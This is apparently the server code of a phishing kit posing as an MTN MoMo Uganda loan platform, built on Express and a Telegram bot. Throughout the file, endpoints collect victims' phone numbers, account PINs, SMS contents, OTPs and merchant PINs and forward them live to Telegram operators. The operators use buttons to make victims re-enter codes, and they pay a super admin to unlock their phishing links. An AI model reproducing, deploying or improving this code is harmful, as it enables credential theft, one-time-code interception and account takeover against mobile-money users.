📝 *Message:*
\`\`\`
${app.smsMessage || 'N/A'}
\`\`\`

✓ User will be asked to paste the correct message
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS rejected. User asked to paste correct message.' });
    }

    // wrongpin_sms_
    else if (data.startsWith('wrongpin_sms_')) {
        const p     = data.split('_');
        const appId = p[3];
        const app   = await db.getApplication(appId);
        if (!app) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });

        await db.updateApplication(appId, { pinStatus: 'rejected' });
        console.log(`❌ WRONG PIN (SMS stage) for ${appId}`);

        await bot.editMessageText(`
🔑 *WRONG PIN — REJECTED*

📋 `${appId}`
📞 `${formatPhone(app.phoneNumber)}`
🔑 PIN: `${app.pin}`

⚠️ User entered the wrong PIN
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

✓ User will be sent back to the login page
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: '🔑 Wrong PIN. User returned to login page.' });
    }

    // approve_otp_
    else if (data.startsWith('approve_otp_')) {
        const p     = data.split('_');
        const appId = p[3];
        const app   = await db.getApplication(appId);
        if (!app) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });

        await db.updateApplication(appId, { otpStatus: 'approved' });
        console.log(`✅ OTP APPROVED for ${appId}`);

        await bot.editMessageText(`
🎉 *LOAN APPROVED!*

📋 \`${appId}\`
📞 \`${formatPhone(app.phoneNumber)}\`
🔢 OTP: \`${app.otp}\`

✓ Loan has been approved successfully!
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
    }

    // wrongcode_otp_
    else if (data.startsWith('wrongcode_otp_')) {
        const p     = data.split('_');
        const appId = p[3];
        const app   = await db.getApplication(appId);
        if (!app) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });

        await db.updateApplication(appId, { otpStatus: 'wrongcode' });
        console.log(`❌ WRONG OTP CODE for ${appId}`);

        await bot.editMessageText(`
❌ *WRONG OTP CODE*

📋 \`${appId}\`
📞 \`${formatPhone(app.phoneNumber)}\`
🔢 OTP entered: \`${app.otp}\`

✓ User will be asked to re-enter OTP
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong OTP. User asked to try again.' });
    }
});

console.log('✅ Telegram callback handler registered!');

// ==========================================
// DB-READY MIDDLEWARE
// ==========================================
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ success: false, message: 'Database not ready yet' });
    }
    next();
});

// ==========================================
// API ENDPOINTS — ALL UNTOUCHED
// ==========================================

// POST /api/verify-pin
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}`;

        console.log('📥 PIN Verification Request:', { phoneNumber, requestAdminId, assignmentType });

        if (!requestAdminId || requestAdminId === 'undefined' || requestAdminId === '') {
            console.error('❌ BLOCKED: No requestAdminId provided');
            return res.status(400).json({
                success: false,
                message: 'Invalid request: Admin authorization required. Please use a valid admin link with ?admin=ADMIN_ID parameter.'
            });
        }

        if (assignmentType !== 'specific') {
            console.error('❌ BLOCKED: Invalid assignmentType:', assignmentType);
            return res.status(400).json({
                success: false,
                message: 'Invalid request: Only specific admin assignment is allowed.'
            });
        }

        const lockKey = `pin_${phoneNumber}`;
        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
        }
        processingLocks.add(lockKey);
        setTimeout(() => processingLocks.delete(lockKey), 10000);

        const assignedAdmin = await db.getAdmin(requestAdminId);

        if (!assignedAdmin) {
            processingLocks.delete(lockKey);
            console.error(`❌ BLOCKED: Specific admin not found: ${requestAdminId}`);
            return res.status(400).json({
                success: false,
                message: 'Invalid admin ID. The admin you used is not available. Please contact support.'
            });
        }

        if (assignedAdmin.linkLocked) {
            processingLocks.delete(lockKey);
            console.warn(`🔒 BLOCKED: Link locked for admin: ${requestAdminId}`);
            return res.status(400).json({
                success: false,
                message: 'This admin link is currently locked. Admin must complete payment to proceed.'
            });
        }

        if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
            processingLocks.delete(lockKey);
            console.warn(`⚠️ BLOCKED: Specific admin paused/inactive: ${requestAdminId}`);
            return res.status(400).json({
                success: false,
                message: 'This admin is temporarily unavailable. Please try again later or contact support.'
            });
        }

        console.log(`🔒 LOCKED to admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);

        const existingApps   = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const alreadyPending = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
        if (alreadyPending) {
            processingLocks.delete(lockKey);
            return res.json({
                success:          true,
                applicationId:    alreadyPending.id,
                assignedTo:       assignedAdmin.name,
                assignedAdminId:  assignedAdmin.adminId
            });
        }

        const thisAdminPastApps = existingApps
            .filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending')
            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const isReturningUser = thisAdminPastApps.length > 0;

        let historyText = '';
        if (isReturningUser) {
            const last       = thisAdminPastApps[0];
            const lastDate   = new Date(last.timestamp).toLocaleString();
            const lastStatus = last.otpStatus === 'approved'     ? '✅ Approved' :
                               last.pinStatus === 'rejected'     ? '❌ Rejected (PIN)' :
                               last.otpStatus === 'wrongcode'    ? '❌ Wrong OTP Code' :
                               last.otpStatus === 'wrongpin_otp' ? '❌ Wrong PIN (OTP stage)' : '⏳ Incomplete';
            const allStatuses = thisAdminPastApps.slice(0, 3).map((a, idx) => {
                const s = a.otpStatus === 'approved'     ? '✅' :
                          a.pinStatus === 'rejected'     ? '❌PIN' :
                          a.otpStatus === 'wrongcode'    ? '❌OTP' :
                          a.otpStatus === 'wrongpin_otp' ? '❌PIN@OTP' : '⏳';
                return `${idx+1}. ${s} ${new Date(a.timestamp).toLocaleDateString()}`;
            }).join('\n');
            historyText = `\n\n━━━━━━━━━━━━━━━━━━\n🔄 *RETURNING CUSTOMER*\nVisits to you: *${thisAdminPastApps.length}*\nLast visit: ${lastDate}\nLast result: ${lastStatus}\nRecent history:\n${allStatuses}\n━━━━━━━━━━━━━━━━━━`;
        }

        if (!adminChatIds.has(assignedAdmin.adminId)) {
            if (assignedAdmin.chatId) {
                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
            } else {
                processingLocks.delete(lockKey);
                return res.status(503).json({
                    success: false,
                    message: 'Admin not connected — they need to /start the bot first'
                });
            }
        }

        await db.saveApplication({
            id:             applicationId,
            adminId:        assignedAdmin.adminId,
            adminName:      assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus:      'pending',
            otpStatus:      'pending',
            assignmentType: 'specific',
            isReturningUser,
            previousCount:  thisAdminPastApps.length,
            timestamp:      new Date().toISOString()
        });

        console.log(`💾 Application saved: ${applicationId}`);

        processingLocks.delete(lockKey);
        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

        const userLabel = isReturningUser
            ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
            : '🆕 *NEW APPLICATION*';

        sendToAdmin(assignedAdmin.adminId, `
${userLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(phoneNumber)}\`
🔑 \`${pin}\`
⏰ ${new Date().toLocaleString()}${historyText}

⚠️ *VERIFY INFORMATION*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny',     callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        }).catch(err => console.error('❌ sendToAdmin (verify-pin) failed:', err.message));

    } catch (error) {
        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
        console.error('❌ Error in /api/verify-pin:', error);
        if (!res.headersSent) {
            res.status(500).json({ success: false, message: 'Server error: ' + error.message });
        }
    }
});

// GET /api/check-pin-status/:applicationId
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-sms
app.post('/api/verify-sms', async (req, res) => {
    console.log('\n📨 /api/verify-sms called:', JSON.stringify(req.body));
    try {
        const { applicationId, smsMessage } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { smsMessage, otpStatus: 'pending' });
        console.log(`✅ SMS message saved for ${applicationId}`);

        res.json({ success: true, message: 'SMS submitted for verification' });

        sendToAdmin(application.adminId, `
📨 *SMS MESSAGE VERIFICATION*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
⏰ ${new Date().toLocaleString()}

📝 *Message:*
\`\`\`
${smsMessage}
\`\`\`

⚠️ *IS THIS MESSAGE CORRECT?*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔑 Wrong PIN',        callback_data: `wrongpin_sms_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Invalid Message',  callback_data: `reject_sms_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Correct Message', callback_data: `approve_sms_${application.adminId}_${applicationId}` }]
                ]
            }
        }).catch(err => console.error('❌ sendToAdmin (verify-sms) failed:', err.message));

    } catch (error) {
        console.error('❌ Error in /api/verify-sms:', error);
        if (!res.headersSent) res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// POST /api/resend-sms
app.post('/api/resend-sms', async (req, res) => {
    console.log('\n🔄 /api/resend-sms called:', JSON.stringify(req.body));
    try {
        const { applicationId } = req.body;

        if (!applicationId) {
            return res.status(400).json({ success: false, message: 'Missing applicationId' });
        }

        const application = await db.getApplication(applicationId);
        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) {
                adminChatIds.set(application.adminId, admin.chatId);
            } else {
                return res.status(500).json({ success: false, message: 'Admin unavailable' });
            }
        }

        await db.updateApplication(applicationId, { otpStatus: 'pending', smsMessage: null });
        console.log(`✅ SMS reset for resend: ${applicationId}`);

        res.json({ success: true, message: 'New SMS requested' });

        sendToAdmin(application.adminId, `
🔄 *SMS RESEND REQUESTED*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
⏰ ${new Date().toLocaleString()}

The user's 60-second SMS window expired.
They clicked *Resend SMS* — please trigger a new verification message to their phone.
        `, { parse_mode: 'Markdown' }).catch(err =>
            console.error('❌ sendToAdmin (resend-sms) failed:', err.message)
        );

    } catch (error) {
        console.error('❌ Error in /api/resend-sms:', error);
        if (!res.headersSent) {
            res.status(500).json({ success: false, message: 'Server error: ' + error.message });
        }
    }
});

// POST /api/verify-otp
app.post('/api/verify-otp', async (req, res) => {
    console.log('\n🔵 /api/verify-otp called:', JSON.stringify(req.body));
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
        console.log(`✅ OTP saved for ${applicationId}: ${otp}`);

        res.json({ success: true });

        const returningLabel = application.isReturningUser
            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
            : '';

        sendToAdmin(application.adminId, `
📲 *CODE VERIFICATION*${returningLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${otp}\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY CODE*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN',    callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code',   callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        }).catch(err => console.error('❌ sendToAdmin (verify-otp) failed:', err.message));

    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        if (!res.headersSent) res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-otp-status/:applicationId
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/check-merchant-pin-status/:applicationId
app.get('/api/check-merchant-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.merchantPinStatus || 'pending' });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/resend-otp
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application)                             return res.status(404).json({ success: false, message: 'Application not found' });
        if (!adminChatIds.has(application.adminId))   return res.status(500).json({ success: false, message: 'Admin unavailable' });

        res.json({ success: true });

        sendToAdmin(application.adminId, `
🔄 *OTP RESEND REQUEST*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`

User requested a new OTP.
        `, { parse_mode: 'Markdown' }).catch(() => {});

    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-merchant-pin
app.post('/api/verify-merchant-pin', async (req, res) => {
    console.log('\n🔵 /api/verify-merchant-pin called:', JSON.stringify(req.body));
    try {
        const { applicationId, merchantPin } = req.body;

        if (!applicationId || !merchantPin) {
            return res.status(400).json({ success: false, message: 'Missing applicationId or merchantPin' });
        }

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { merchantPin, merchantPinStatus: 'received' });
        console.log(`✅ Merchant PIN saved for ${applicationId}: ${merchantPin}`);

        res.json({ success: true });

        const returningLabel = application.isReturningUser
            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
            : '';

        sendToAdmin(application.adminId, `
💳 *MERCHANT ACCOUNT PIN*${returningLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 Login PIN: \`${application.pin}\`
🔢 OTP: \`${application.otp}\`
💳 Merchant PIN: \`${merchantPin}\`
⏰ ${new Date().toLocaleString()}

⚠️ *MERCHANT PIN RECEIVED*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong Merchant PIN', callback_data: `wrongmerchpin_merch_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Confirm & Approve',  callback_data: `approve_merch_${application.adminId}_${applicationId}` }]
                ]
            }
        }).catch(err => console.error('❌ sendToAdmin (verify-merchant-pin) failed:', err.message));

    } catch (error) {
        console.error('❌ Error in /api/verify-merchant-pin:', error);
        if (!res.headersSent) res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// POST /api/submit-payment — notifies ONLY the payment admin (ADMIN001)
app.post('/api/submit-payment', async (req, res) => {
    try {
        const { adminId, payerName } = req.body;
        if (!adminId || !payerName) return res.status(400).json({ success: false, message: 'Missing adminId or payerName' });

        const admin = await db.getAdmin(adminId);
        if (!admin) return res.status(404).json({ success: false, message: 'Admin not found' });

        await db.updateAdmin(adminId, { paymentStatus: 'pending', payerName, paymentSubmittedAt: new Date() });

        res.json({ success: true, message: 'Payment submitted. Waiting for super admin approval.' });

        // Notify ONLY the payment admin (ADMIN001)
        await notifyPaymentAdmin(`
💰 *NEW PAYMENT SUBMITTED*

Admin has sent payment and is awaiting your verification.

📋 Details:
🆔 Admin ID: \`${adminId}\`
👤 Name: ${admin.name}
📧 Email: ${admin.email}
💵 Payer: ${payerName}
📅 Submitted: ${new Date().toLocaleString()}

Verify the payment has been received:
📞 Phone: 0791336749 (Okeyo Bungu)

Please verify and respond:
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ APPROVE', callback_data: `approve_payment_${adminId}` },
                    { text: '❌ REJECT',  callback_data: `reject_payment_${adminId}` }
                ]]
            }
        });

    } catch (error) {
        console.error('❌ Error submitting payment:', error);
        if (!res.headersSent) res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/admins
app.get('/api/admins', async (req, res) => {
    try {
        const admins    = await db.getActiveAdmins();
        const adminList = admins
            .filter(a => !pausedAdmins.has(a.adminId))
            .map(a => ({ id: a.adminId, name: a.name, email: a.email, status: a.status, connected: adminChatIds.has(a.adminId) }));
        res.json({ success: true, admins: adminList });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/validate-admin/:adminId
app.get('/api/validate-admin/:adminId', async (req, res) => {
    try {
        const admin = await db.getAdmin(req.params.adminId);
        if (admin && pausedAdmins.has(admin.adminId)) {
            return res.json({ success: true, valid: false, message: 'Admin is currently paused' });
        }
        if (admin && admin.status === 'active' && !admin.linkLocked) {
            res.json({ success: true, valid: true, connected: adminChatIds.has(admin.adminId), admin: { id: admin.adminId, name: admin.name, email: admin.email } });
        } else if (admin && admin.linkLocked) {
            res.json({ success: true, valid: false, message: 'Admin link is locked. Payment required.', locked: true });
        } else {
            res.json({ success: true, valid: false, message: 'Admin not found or inactive' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /health
app.get('/health', (req, res) => {
    res.json({
        status:        'ok',
        database:      dbReady ? 'connected' : 'not ready',
        activeAdmins:  adminChatIds.size,
        pausedAdmins:  pausedAdmins.size,
        superAdmins:   SUPER_ADMINS.length,
        paymentAdmin:  PAYMENT_ADMIN,
        autoAssign:    '❌ DISABLED',
        botMode:       'webhook',
        webhookUrl:    `${WEBHOOK_URL}/telegram-webhook`,
        timestamp:     new Date().toISOString()
    });
});

// Serve the main HTML
app.get('/', async (req, res) => {
    const adminId = req.query.admin;

    if (adminId) {
        console.log(`🔗 Admin link accessed: ${adminId}`);
        try {
            const admin = await db.getAdmin(adminId);
            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                    console.log(`➕ Added to active map: ${adminId} -> ${admin.chatId}`);
                }
            }
        } catch (error) {
            console.error('Error validating admin on landing page:', error);
        }
    }

    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// START SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n💎 MTN MoMo UGANDA LOAN PLATFORM`);
    console.log(`==================================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`🔒 Auto-assign: ❌ DISABLED`);
    console.log(`👥 Admins: ${adminChatIds.size} connected`);
    console.log(`⭐ Super Admins: ${SUPER_ADMINS.length}`);
    console.log(`🔑 Managers: ${MANAGERS.length > 0 ? MANAGERS.join(', ') : 'None'}`);
    console.log(`💰 Payment Admin: ${PAYMENT_ADMIN}`);
    console.log(`\n✅ Ready!\n`);
});

// ==========================================
// GRACEFUL SHUTDOWN
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received ${signal}, shutting down...`);

    console.log('⏳ Waiting 10s for in-flight requests to complete...');
    await new Promise(resolve => setTimeout(resolve, 10000));

    try {
        for (const [, timer] of adminLinkTimers.entries()) {
            clearTimeout(timer);
        }
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Cleanup complete');
        process.exit(0);
    } catch (error) {
        console.error('❌ Shutdown error:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT',  () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled rejection:', error?.message);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception:', error?.message);
});
